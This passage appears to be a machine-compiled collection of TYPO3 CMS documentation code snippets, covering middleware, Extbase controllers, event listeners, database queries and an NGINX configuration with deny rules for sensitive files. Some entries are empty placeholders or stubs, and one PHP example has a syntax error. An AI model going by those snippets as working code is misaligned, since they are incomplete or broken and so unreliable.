TYPO3\\CMS\\Core\\Http\\Stream;\n\nclass NotAvailableMiddleware implements MiddlewareInterface\n{\n    public function process(\n        ServerRequestInterface $request,\n        RequestHandlerInterface $handler\n    ): ResponseInterface {\n        // Example check if it's a specific route\n        $uri = $request->getUri();\n        $path = $uri->getPath();\n        if ($path === '/foo/bar') {\n            $body = new Stream('php://temp', 'rw');\n            $body->write('This page is currently not available.');\n            return new Response($body, 503);\n        }\n        return $handler->handle($request);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: External Redirect using ResponseFactory\nDESCRIPTION: This code demonstrates how to perform an external redirect from an Extbase controller action using the `responseFactory`. It creates a redirect response and returns it, causing the browser to redirect to the specified URI.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nfinal class MyController extends ActionController\n{\n    /**\n     * @return ResponseInterface\n     */\n    public function redirectAction(): ResponseInterface\n    {\n        return $this->responseFactory\n            ->createResponse()\n            ->withStatus(302)\n            ->withHeader('Location', 'https://example.org');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Core Extension Configuration Service in TYPO3\nDESCRIPTION: Core service class for extension configuration with service alias definition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\n#[AsAlias('my_extension.configuration')]\nclass CoreExtensionConfiguration\n{\n    // Implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing XLIFF Labels in Fluid Templates\nDESCRIPTION: Shows how to retrieve localized strings in Fluid templates using the f:translate ViewHelper. The example demonstrates both tag and inline notation styles, specifying the extension name to locate the correct XLIFF file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/XliffApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<f:translate key=\"key1\" extensionName=\"SomeExtensionName\" />\n// or inline notation\n{f:translate(key: 'someKey', extensionName: 'SomeExtensionName')}\n```\n\n----------------------------------------\n\nTITLE: Configuring NGINX for TYPO3 CMS\nDESCRIPTION: Complete NGINX configuration file that handles GZIP compression, static file versioning, security restrictions, and PHP-FPM processing for TYPO3 CMS. Includes settings for blocking access to sensitive files, handling URL rewrites, and configuring FastCGI parameters for PHP processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/SystemRequirements/NGINX.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: nginx\nCODE:\n```\n# Compressing resource files will save bandwidth and so improve loading speed especially for users\n# with slower internet connections. TYPO3 can compress the .js and .css files for you.\n# *) Set $GLOBALS['TYPO3_CONF_VARS']['BE']['compressionLevel'] = 9 for the Backend\n# *) Set $GLOBALS['TYPO3_CONF_VARS']['FE']['compressionLevel'] = 9 together with the TypoScript properties\n#    config.compressJs and config.compressCss for GZIP compression of Frontend JS and CSS files.\nlocation ~ \\.js\\.gzip$ {\n    add_header Content-Encoding gzip;\n    gzip off;\n    types { text/javascript gzip; }\n}\nlocation ~ \\.css\\.gzip$ {\n    add_header Content-Encoding gzip;\n    gzip off;\n    types { text/css gzip; }\n}\n\n# TYPO3 - Rule for versioned static files, configured through:\n# - $GLOBALS['TYPO3_CONF_VARS']['BE']['versionNumberInFilename']\n# - $GLOBALS['TYPO3_CONF_VARS']['FE']['versionNumberInFilename']\nif (!-e $request_filename) {\n    rewrite ^/(.+)\\.(\\d+)\\.(php|js|css|png|jpg|gif|gzip)$ /$1.$3 last;\n}\n\n# TYPO3 - Block access to composer files\nlocation ~* composer\\.(?:json|lock) {\n    deny all;\n}\n\n# TYPO3 - Block access to flexform files\nlocation ~* flexform[^.]*\\.xml {\n    deny all;\n}\n\n# TYPO3 - Block access to language files\nlocation ~* locallang[^.]*\\.(?:xml|xlf)$ {\n    deny all;\n}\n\n# TYPO3 - Block access to static typoscript files\nlocation ~* ext_conf_template\\.txt|ext_typoscript_constants\\.txt|ext_typoscript_setup\\.txt {\n    deny all;\n}\n\n# TYPO3 - Block access to miscellaneous protected files\nlocation ~* /.*\\.(?:bak|co?nf|cfg|ya?ml|ts|typoscript|tsconfig|dist|fla|in[ci]|log|sh|sql|sqlite)$ {\n    deny all;\n}\n\n# TYPO3 - Block access to recycler and temporary directories\nlocation ~ _(?:recycler|temp)_/ {\n    deny all;\n}\n\n# TYPO3 - Block access to configuration files stored in fileadmin\nlocation ~ fileadmin/(?:templates)/.*\\.(?:txt|ts|typoscript)$ {\n    deny all;\n}\n\n# TYPO3 - Block access to libraries, source and temporary compiled data\nlocation ~ ^(?:vendor|typo3_src|typo3temp/var) {\n    deny all;\n}\n\n# TYPO3 - Block access to protected extension directories\nlocation ~ (?:typo3conf/ext|typo3/sysext|typo3/ext)/[^/]+/(?:Configuration|Resources/Private|Tests?|Documentation|docs?)/ {\n    deny all;\n}\n\nlocation / {\n    try_files $uri $uri/ /index.php$is_args$args;\n}\n\nlocation = /typo3 {\n    rewrite ^ /typo3/;\n}\n\nlocation /typo3/ {\n    absolute_redirect off;\n    try_files $uri /index.php$is_args$args;\n}\n\nlocation ~ [^/]\\.php(/|$) {\n    fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n    if (!-f $document_root$fastcgi_script_name) {\n        return 404;\n    }\n    fastcgi_buffer_size 32k;\n    fastcgi_buffers 8 16k;\n    fastcgi_connect_timeout 240s;\n    fastcgi_read_timeout 240s;\n    fastcgi_send_timeout 240s;\n\n    # this is the PHP-FPM upstream - see also: https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/#connecting-nginx-to-php-fpm\n    fastcgi_pass         php-fpm:9000;\n    fastcgi_index        index.php;\n    include              fastcgi.conf;\n}\n```\n\n----------------------------------------\n\nTITLE: Using Native JSON Fields in TYPO3 Database Operations\nDESCRIPTION: Example of inserting records with JSON data that is automatically serialized when using the native JSON database field type. This leverages Doctrine's type mapping for convenient data conversion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: php\nCODE:\n```\npublic function createWithJsonField(string $title, array $settings): void\n{\n    $data = [\n        'title' => $title,\n        // Automatic conversion from array to JSON string in database\n        'settings' => $settings\n    ];\n\n    $connection = GeneralUtility::makeInstance(ConnectionPool::class)\n        ->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->insert('tx_myextension_domain_model_mytable', $data);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Response Enriching Middleware in TYPO3\nDESCRIPTION: This middleware demonstrates how to enhance the response by checking the content length and adding a header with this information before returning the response up the middleware chain.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\nnamespace MyVendor\\MyExtension\\Middleware;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\MiddlewareInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass ResponseEnrichingMiddleware implements MiddlewareInterface\n{\n    public function process(\n        ServerRequestInterface $request,\n        RequestHandlerInterface $handler\n    ): ResponseInterface {\n        // Call next handler in chain and retrieve response\n        $response = $handler->handle($request);\n\n        // Get body contents, e.g. to check length of output\n        $body = $response->getBody();\n        $bodyContent = $body->getContents();\n        // According to PSR-7 we need to rewind after reading\n        $body->rewind();\n\n        // Return enriched response, e.g. add header with content length\n        return $response->withAddedHeader('X-Content-Length', strlen($bodyContent));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Feature Status in PHP Class\nDESCRIPTION: Demonstrates how to properly inject and use the Features service in a PHP class to check if a specific feature is enabled. This example uses constructor dependency injection and a conditional check within a method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Configuration\\Features;\n\nfinal class SomeClass {\n    public function __construct(\n        private readonly Features $features,\n    ) {\n    }\n\n    public function doSomething(): void\n    {\n        if ($this->features->isFeatureEnabled('myFeatureName') {\n            // do custom processing\n        }\n\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterUserLoggedInEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for the AfterUserLoggedInEvent that handles post-login actions for both backend and frontend users. The event was introduced in TYPO3 12.3 and expanded in 13.0 to include frontend user logins.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/AfterUserLoggedInEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Authentication\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Authentication\\Event\\AfterUserLoggedInEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterUserLoggedInEvent $event): void\n    {\n        // Add custom functionality after user login\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling File Uploads in Extbase Controller with Manual Evaluation\nDESCRIPTION: This code snippet demonstrates how to manually handle file uploads in an Extbase controller in PHP for TYPO3 versions below v13.3. It involves evaluating the $_FILES array, processing, validating the data, and using QueryBuilder for quick file persistence.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass BlogController extends ActionController {\n\n    public function uploadAction(): void {\n        // This example assumes $files are uploaded via a form\n        $uploadedFiles = $_FILES['myFileInput'];\n        // Manual file validation and processing\n        foreach ($uploadedFiles['error'] as $key => $error) {\n            if ($error === UPLOAD_ERR_OK) {\n                $tmpName = $uploadedFiles['tmp_name'][$key];\n                // Process file and persist information\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing PHPUnit and TYPO3 Testing Framework via Composer\nDESCRIPTION: Composer command to install PHPUnit and the TYPO3 testing framework as development dependencies. This is the first step required to set up unit testing in a TYPO3 project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer require --dev \\\n  \"typo3/testing-framework\":\"^8.0.9\" \\\n  \"phpunit/phpunit\":\"^10.5\"\n```\n\n----------------------------------------\n\nTITLE: Complete MultiStepWizard Implementation Example\nDESCRIPTION: A full example showing how to create a simple \"Hello World\" multi-step wizard with one sheet. Uses the warning severity to color the title and buttons yellow.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n// EXT:my_extension/Resources/Public/JavaScript/HelloWorldModule.js\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Headers in TYPO3 Backend\nDESCRIPTION: This snippet demonstrates how to set HTTP headers for backend requests using the `$GLOBALS['TYPO3_CONF_VARS']['BE']['HTTP']` array. It shows the configuration for setting headers such as `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, and `Referrer-Policy`. The `Strict-Transport-Security` header is only active if `$GLOBALS['TYPO3_CONF_VARS']['BE']['lockSSL']` is enabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n\"[\\n    'Response' => [\\n        'Headers' => [\\n            'clickJackingProtection' => 'X-Frame-Options: SAMEORIGIN',\\n            'strictTransportSecurity' => 'Strict-Transport-Security: max-age=31536000',\\n            'avoidMimeTypeSniffing' => 'X-Content-Type-Options: nosniff',\\n            'referrerPolicy' => 'Referrer-Policy: strict-origin-when-cross-origin',\\n        ],\\n    ],\\n]\"\n```\n\n----------------------------------------\n\nTITLE: Instantiating Connection Object Using ConnectionPool in TYPO3\nDESCRIPTION: Example of creating a repository class that retrieves a database connection through the ConnectionPool. This approach allows connecting to a specific table's configured database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Repository;\n\nuse TYPO3\\CMS\\Core\\Database\\Connection;\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n\nfinal class MyTableRepository\n{\n    public function __construct(\n        private readonly ConnectionPool $connectionPool,\n    ) {\n    }\n\n    public function someMethod(): void\n    {\n        // Get a connection for a specific table\n        $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n\n        // Do something with the connection\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Implementing StrtolowerViewHelper with compile() Method (PHP)\nDESCRIPTION: Example of implementing a StrtolowerViewHelper using the compile() method to optimize performance by directly calling the PHP strtolower function.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_10\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_StrtolowerViewHelper.php\n    :caption: EXT:my_extension/Classes/ViewHelpers/StrtolowerViewHelper.php\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder in Query Context in PHP\nDESCRIPTION: Demonstrates best practice of using the ExpressionBuilder directly within the QueryBuilder context without assigning it to a variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for TYPO3 Mailer API in PHP\nDESCRIPTION: Defines an event listener class that modifies mailer settings to prevent sending emails, using PHP attributes for configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent;\n\n#[AsEventListener(\n    identifier: 'my-extension/do-not-send-mails'\n)]\nfinal class MailerEventListener\n{\n    public function __invoke(BeforeMailerSentMessageEvent $event): void\n    {\n        // Set mailer settings to not send any emails\n        $event->getConfiguration()->setTransport('null');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Instantiating Logger via Constructor Injection in TYPO3\nDESCRIPTION: Example of how to use constructor injection to automatically instantiate a logger in a TYPO3 extension class. This demonstrates the recommended approach for making the PSR-3 LoggerInterface available in your class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Quickstart/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// EXT:my_extension/Classes/MyClass.php\n```\n\n----------------------------------------\n\nTITLE: Registering Event Listener via Services.yaml in TYPO3\nDESCRIPTION: This snippet demonstrates how to register an event listener using the Services.yaml file in a TYPO3 extension. It shows the configuration for the event.listener tag, specifying the listener class and method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\EventListener\\NullMailer:\n    tags:\n      - name: event.listener\n        identifier: 'ext-my-extension/null-mailer'\n        method: 'handleEvent'\n        event: TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent\n```\n\n----------------------------------------\n\nTITLE: Localizing Frontend Content Using LanguageServiceFactory\nDESCRIPTION: Example showing how to use LanguageServiceFactory in a frontend context to translate content based on site language.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function __construct(\n    private readonly LanguageServiceFactory $languageServiceFactory\n) {}\n\npublic function process(array $parameters): string\n{\n    $request = $this->requestStack->getCurrentRequest();\n    if ($request !== null) {\n        $languageService = $this->languageServiceFactory->createFromSiteLanguage($request->getAttribute('language'));\n        return $languageService->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:mystring');\n    }\n    return '';\n}\n```\n\n----------------------------------------\n\nTITLE: Overriding Event Listener with PHP Attribute in TYPO3\nDESCRIPTION: This code snippet demonstrates how to override an existing event listener using the PHP #[AsEventListener] attribute in TYPO3. It specifies the overridden identifier to replace the original implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Frontend\\Event\\ModifyHrefLangTagsEvent;\n\n#[AsEventListener(\n    identifier: 'ext-some-extension/modify-hreflang'\n)]\nfinal class MySeoEvent\n{\n    public function __invoke(ModifyHrefLangTagsEvent $event): void\n    {\n        // custom implementation\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Password Policies for Development in TYPO3\nDESCRIPTION: Configuration to disable password policies in development context by setting empty strings for both frontend and backend password policies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/PasswordPolicies/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nif (\\TYPO3\\CMS\\Core\\Core\\Environment::getContext()->isDevelopment()) {\n    $GLOBALS['TYPO3_CONF_VARS']['BE']['passwordPolicy'] = '';\n    $GLOBALS['TYPO3_CONF_VARS']['FE']['passwordPolicy'] = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Reusing Prepared Statements in TYPO3 PHP\nDESCRIPTION: Example demonstrating how to prepare a statement once and execute it multiple times with different parameters. This approach improves performance when the same query is executed repeatedly with different values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Statement/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('pages');\n$statement = $queryBuilder\n    ->select('uid')\n    ->from('pages')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'uid',\n            $queryBuilder->createPositionalParameter(0, Connection::PARAM_INT)\n        )\n    )\n    ->prepare();\n\n$pages = [];\nforeach ([24, 25] as $pageId) {\n    // Bind $pageId value to the first (and in this case only) positional parameter\n    $statement->bindValue(1, $pageId, Connection::PARAM_INT);\n    $result = $statement->executeQuery();\n    $pages[] = $result->fetchAssociative();\n    $result->free(); // free the resources for this result\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Fields to User Settings in TYPO3 CMS - PHP\nDESCRIPTION: This snippet demonstrates how to add a new field to the TYPO3 user settings by modifying the $GLOBALS['TYPO3_USER_SETTINGS'] array and using the addFieldsToUserSettings() method. The example code should be placed in the ext_tables.php file. It highlights the positioning of the new field after the 'email' field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Extending.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _ext_tables.php\n    :language: php\n    :caption: EXT:examples/ext_tables.php\n```\n\n----------------------------------------\n\nTITLE: Using GravatarViewHelper as Post-processor (HTML)\nDESCRIPTION: Example of using the GravatarViewHelper as a post-processor for an email address in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_8\n\nLANGUAGE: HTML\nCODE:\n```\n{post.author.emailAddress -> m:gravatar()}\n```\n\n----------------------------------------\n\nTITLE: Accessing TypoScriptFrontendController Using Request Attribute in PHP\nDESCRIPTION: This snippet demonstrates how to access the TypoScriptFrontendController object using the frontend.controller request attribute instead of the deprecated global variable $GLOBALS['TSFE']. The example shows retrieving the rootLine property from the controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendController.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$frontendController = $request->getAttribute('frontend.controller');\n$rootline = $frontendController->rootLine;  // Mind the capital \"L\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving the File Object in TYPO3 BeforeFileReplacedEvent Class in PHP\nDESCRIPTION: Method to access the FileInterface object for the file being replaced. This allows listeners to access the file's metadata and properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileReplacedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for ModifyInlineElementEnabledControlsEvent\nDESCRIPTION: Defines a PHP class for handling inline element control modifications in TYPO3 CMS backend forms. The class provides methods for enabling, disabling, and checking control states, as well as accessing element data and configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyInlineElementEnabledControlsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyInlineElementEnabledControlsEvent {\n    public function enableControl(string $identifier): bool {}\n    public function disableControl(string $identifier): bool {}\n    public function hasControl(string $identifier): bool {}\n    public function isControlEnabled(string $identifier): bool {}\n    public function getControlsState(): array {}\n    public function getEnabledControls(): array {}\n    public function getElementData(): array {}\n    public function getRecord(): array {}\n    public function getParentUid(): string {}\n    public function getForeignTable(): string {}\n    public function getFieldConfiguration(): array {}\n    public function isVirtual(): bool {}\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Preview Renderer for All Records\nDESCRIPTION: TCA configuration to specify a preview renderer class for all records of a specific table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomBackendPreview.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA'][$table]['ctrl']['previewRenderer'] \n    = MyVendor\\MyExtension\\Preview\\MyPreviewRenderer::class;\n```\n\n----------------------------------------\n\nTITLE: Using IconFactory to Render Icons in PHP\nDESCRIPTION: Example of how to use the TYPO3 IconFactory class to render icons in PHP code. The snippet shows instantiation of the IconFactory and demonstrates how to render icons with different sizes using the IconSize enum.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Icon/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// Get icon factory\n$iconFactory = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\Imaging\\IconFactory::class\n);\n\n// Get icon with default size\n$defaultIcon = $iconFactory->getIcon(\n    'tx-myext-example',\n    \\TYPO3\\CMS\\Core\\Imaging\\IconSize::DEFAULT\n);\n\n// Get icon with medium size\n$mediumSizeIcon = $iconFactory->getIcon(\n    'tx-myext-example',\n    \\TYPO3\\CMS\\Core\\Imaging\\IconSize::MEDIUM\n);\n\n// Output markup for icon\n$html = $defaultIcon->render();\n```\n\n----------------------------------------\n\nTITLE: Adding a Flash Message to the Queue in TYPO3 CMS\nDESCRIPTION: This code shows how to add a flash message to the message queue using the FlashMessageService in TYPO3 CMS. It demonstrates retrieving the message queue and adding a message to it.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/FlashMessagesApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessageService;\n\n$flashMessageService = GeneralUtility::makeInstance(FlashMessageService::class);\n$messageQueue = $flashMessageService->getMessageQueueByIdentifier();\n$messageQueue->addMessage($message);\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyRedirectUrlValidationResultEvent Class in PHP\nDESCRIPTION: This snippet defines the ModifyRedirectUrlValidationResultEvent class with methods for getting and setting redirect URL validation results. It includes methods to retrieve the redirect URL, get and set the validation result, and access the server request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/ModifyRedirectUrlValidationResultEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass ModifyRedirectUrlValidationResultEvent\n{\n    public function getRedirectUrl(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getValidationResult(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function setValidationResult(bool $validationResult): void\n    {\n        // Implementation not shown\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching Results with fetchAssociative() in TYPO3 PHP\nDESCRIPTION: Example of using fetchAssociative() to iterate through database results one row at a time. This approach is memory-efficient for large result sets as it retrieves only one row at a time in a while loop.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Statement/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection\n// Fetch all records from tt_content on page 42\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$result = $queryBuilder\n    ->select('uid', 'bodytext')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'pid',\n            $queryBuilder->createNamedParameter(42, Connection::PARAM_INT)\n        )\n    )\n  ->executeQuery();\n\nwhile ($row = $result->fetchAssociative()) {\n    // Do something useful with that single $row\n}\n```\n\n----------------------------------------\n\nTITLE: Debugging All Available Variables in Fluid Templates\nDESCRIPTION: Example showing how to inspect all available variables in a Fluid template using the special _all placeholder with the debug ViewHelper. This is useful for discovering what variables are accessible in a template context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Debugging/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<f:debug>{_all}</f:debug>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Password Policy in TYPO3\nDESCRIPTION: Configuration to define a custom password policy with the identifier 'simple' that uses the CorePasswordValidator with a minimum password length of 6 characters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/PasswordPolicies/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['passwordPolicies'] = [\n    'simple' => [\n        'validators' => [\n            \\TYPO3\\CMS\\Core\\PasswordPolicy\\Validator\\CorePasswordValidator::class => [\n                'options' => [\n                    'minimumLength' => 6,\n                ],\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Registering an Extbase Plugin with FlexForm Configuration\nDESCRIPTION: Example showing how to register an Extbase plugin and attach a FlexForm configuration to it using ExtensionUtility and getting the plugin signature from the registration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n$pluginSignature = ExtensionUtility::registerPlugin(\n    